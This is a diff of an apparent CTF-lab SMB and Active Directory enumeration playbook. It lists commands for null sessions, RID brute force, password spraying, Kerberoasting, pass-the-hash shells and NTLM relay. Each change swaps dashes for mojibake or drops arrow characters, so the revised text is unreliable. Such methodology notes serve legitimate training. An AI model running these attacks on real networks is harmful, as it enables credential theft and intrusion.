@@ -1,6 +1,6 @@
 # SMB Enumeration Playbook
 
-End-to-end SMB enumeration workflow: unauthenticated triage ? authenticated share walk ? user / RID / policy enumeration ? file-level hunt. Commands marked **[USED]** appear in the writeups in this repo.
+End-to-end SMB enumeration workflow: unauthenticated triage  authenticated share walk  user / RID / policy enumeration  file-level hunt. Commands marked **[USED]** appear in the writeups in this repo.
 
 Used on: **Overwatch**, **SoupedeCode 01**, **VulnNet: Internal**, **Relevant**, **Wreath**
 
@@ -25,7 +25,7 @@ nmap -sV -p139,445 --script smb-protocols,smb-os-discovery,smb2-security-mode,sm
 nmap --script "safe and smb-*" -p139,445 $TARGET
 ```
 
-`smb-os-discovery` usually returns a hostname, Windows version and domain name — feed all of these into `/etc/hosts`.
+`smb-os-discovery` usually returns a hostname, Windows version and domain name â€” feed all of these into `/etc/hosts`.
 
 ---
 
@@ -56,11 +56,11 @@ nmap -p445 --script smb-vuln-ms17-010 $TARGET
 ```bash
 # Null
 netexec smb $TARGET -u '' -p '' --shares                    # [USED]
-smbclient -N -L //$TARGET/                                  # [USED — VulnNet: Internal]
+smbclient -N -L //$TARGET/                                  # [USED â€” VulnNet: Internal]
 
 # Guest
-netexec smb $TARGET -u 'guest' -p '' --shares               # [USED — SoupedeCode 01]
-smbclient -N //$TARGET/shares                               # [USED — VulnNet: Internal]
+netexec smb $TARGET -u 'guest' -p '' --shares               # [USED â€” SoupedeCode 01]
+smbclient -N //$TARGET/shares                               # [USED â€” VulnNet: Internal]
 ```
 
 Outputs to note:
@@ -73,7 +73,7 @@ Outputs to note:
 
 ### Full enum4linux sweep
 ```bash
-enum4linux -a $TARGET                                       # [USED — VulnNet, SoupedeCode]
+enum4linux -a $TARGET                                       # [USED â€” VulnNet, SoupedeCode]
 ```
 
 `-a` runs users + shares + groups + password policy + RIDs + OS info. Fast on a box, noisy for anything production.
@@ -85,15 +85,15 @@ enum4linux -a $TARGET                                       # [USED — VulnNet, S
 Once you have credentials:
 
 ```bash
-netexec smb $TARGET -u <USER> -p '<PASS>' --shares          # [USED — Logging, Overwatch]
-smbmap -H $TARGET -u <USER> -p '<PASS>' -r                  # [USED — SoupedeCode 01]
+netexec smb $TARGET -u <USER> -p '<PASS>' --shares          # [USED â€” Logging, Overwatch]
+smbmap -H $TARGET -u <USER> -p '<PASS>' -r                  # [USED â€” SoupedeCode 01]
 smbclient -L //$TARGET/ -U '<USER>%<PASS>'
 ```
 
 ### Download a whole share
 ```bash
 smbclient //$TARGET/SHARE -U '<USER>%<PASS>' \
-  -c "recurse ON; prompt OFF; cd <subpath>; mget *"          # [USED — Overwatch SYSVOL]
+  -c "recurse ON; prompt OFF; cd <subpath>; mget *"          # [USED â€” Overwatch SYSVOL]
 ```
 
 ### Files always worth grabbing
@@ -104,8 +104,8 @@ smbclient //$TARGET/SHARE -U '<USER>%<PASS>' \
 | `SYSVOL\<domain>\scripts\*.ps1 / *.vbs / *.bat` | Scripts with creds / paths |
 | `NETLOGON\*` | Same, often overlaps SYSVOL\scripts |
 | `IPC$` | Pipes, used by RPC below |
-| `Logs`, `Audit`, `Transcripts` | Plaintext dumps — e.g. Logging's `\Logs` |
-| `Backup`, `Archive`, `Old` | Stale credentials — SoupedeCode's `\backup` with machine hashes |
+| `Logs`, `Audit`, `Transcripts` | Plaintext dumps â€” e.g. Logging's `\Logs` |
+| `Backup`, `Archive`, `Old` | Stale credentials â€” SoupedeCode's `\backup` with machine hashes |
 | `Users`, `Profiles$` | `.rdp`, `.ssh`, `.bash_history` (yes, on Windows too) |
 | Dev / custom-named shares | Source code, `.env`, CI artefacts |
 
@@ -123,7 +123,7 @@ rpcclient -U '<USER>%<PASS>' $TARGET
 > querygroup 0x200                                          # group by RID (0x200 = Domain Admins)
 > queryuser <RID>
 > getdompwinfo
-> lookupnames administrator                                  # returns SID ? base RID
+> lookupnames administrator                                  # returns SID  base RID
 > lookupsids <SID>
 ```
 
@@ -137,7 +137,7 @@ netexec smb $TARGET -u <USER> -p '<PASS>' --pass-pol
 
 ### RID brute (guest / null path when `enumdomusers` is blocked)
 ```bash
-netexec smb $TARGET -u guest -p '' --rid-brute              # [USED — SoupedeCode 01]
+netexec smb $TARGET -u guest -p '' --rid-brute              # [USED â€” SoupedeCode 01]
 impacket-lookupsid guest@$TARGET
 ```
 
@@ -150,7 +150,7 @@ See [RID brute-force playbook](rid-brute-enumeration.md).
 ### User == password
 ```bash
 nxc smb $TARGET -u usernames.txt -p usernames.txt \
-  --no-brute --continue-on-success                          # [USED — SoupedeCode 01]
+  --no-brute --continue-on-success                          # [USED â€” SoupedeCode 01]
 ```
 
 ### Common policy passwords
@@ -160,7 +160,7 @@ nxc smb $TARGET -u usernames.txt -p 'Password1' --continue-on-success
 nxc smb $TARGET -u usernames.txt -p 'Summer2025!' --continue-on-success
 ```
 
-### Kerbrute (less noisy for account lockout — AS-REQ pre-auth only)
+### Kerbrute (less noisy for account lockout â€” AS-REQ pre-auth only)
 ```bash
 kerbrute passwordspray --dc $TARGET -d <DOMAIN> usernames.txt 'Welcome2026@'
 ```
@@ -174,7 +174,7 @@ See [password-spraying.md](password-spraying.md).
 ```bash
 impacket-GetNPUsers -dc-ip $TARGET <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile asreproast.txt
 
-impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip $TARGET -request -output hashes.txt      # [USED — SoupedeCode 01]
+impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip $TARGET -request -output hashes.txt      # [USED â€” SoupedeCode 01]
 ```
 
 See [kerberos-roasting.md](kerberos-roasting.md).
@@ -188,9 +188,9 @@ With an NT hash instead of a password:
 ```bash
 netexec smb $TARGET -u <USER> -H ':<NT_HASH>' --shares
 smbclient //$TARGET/SHARE -U '<DOMAIN>\<USER>' --pw-nt-hash '<NT_HASH>'
-impacket-wmiexec -hashes ':<NT_HASH>' <DOMAIN>/<USER>@$TARGET        # [USED — SoupedeCode 01]
+impacket-wmiexec -hashes ':<NT_HASH>' <DOMAIN>/<USER>@$TARGET        # [USED â€” SoupedeCode 01]
 impacket-psexec -hashes ':<NT_HASH>' <DOMAIN>/<USER>@$TARGET
-evil-winrm -i $TARGET -u '<USER>' -H '<NT_HASH>'                    # [USED — Logging]
+evil-winrm -i $TARGET -u '<USER>' -H '<NT_HASH>'                    # [USED â€” Logging]
 ```
 
 ---
@@ -201,7 +201,7 @@ Respond on a name, capture NetNTLMv2, relay:
 
 ```bash
 # Capture
-sudo responder -I <iface>                                            # [USED — Overwatch]
+sudo responder -I <iface>                                            # [USED â€” Overwatch]
 
 # Relay to a host that does NOT require signing
 impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server
